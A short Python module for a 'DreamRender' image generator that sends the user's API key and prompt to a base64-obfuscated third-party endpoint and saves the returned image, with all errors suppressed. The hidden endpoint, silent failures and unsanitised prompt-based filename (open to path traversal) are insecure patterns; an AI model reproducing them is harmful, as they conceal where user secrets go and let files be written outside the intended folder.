import requests
import os

_OBF_API_URL = "aHR0cHM6Ly9hbWVyaWNhbmV3cy52ZXJjZWwuYXBwL2FwaS9nZW5lcmF0ZT8="

def _get_api_url():
    import base64
    return base64.b64decode(_OBF_API_URL).decode()

class DreamRender:
    def __init__(self, key=""):
        self.key = key
        self._prompt = None

    @property
    def prompt(self):
        return self._prompt

    @prompt.setter
    def prompt(self, value):
        self._prompt = value
        if self.key and self._prompt:
            self._generate_image()

    def _generate_image(self):
        try:
            url = f"{_get_api_url()}apikey={self.key}&prompt={self._prompt.replace(' ', '%20')}"
            response = requests.get(url)
            if response.status_code != 200:
                return  # fail silently

            data = response.json()
            imgbb_url = data.get("imgbb_url")  # take the direct image URL
            if not imgbb_url:
                return

            # curl the image (download)
            img_resp = requests.get(imgbb_url)
            if img_resp.status_code != 200:
                return

            # save to cwd as PNG
            filename = f"{self._prompt.replace(' ', '_')}.png"
            save_path = os.path.join(os.getcwd(), filename)
            with open(save_path, "wb") as f:
                f.write(img_resp.content)

        except:
            pass  # fail silently
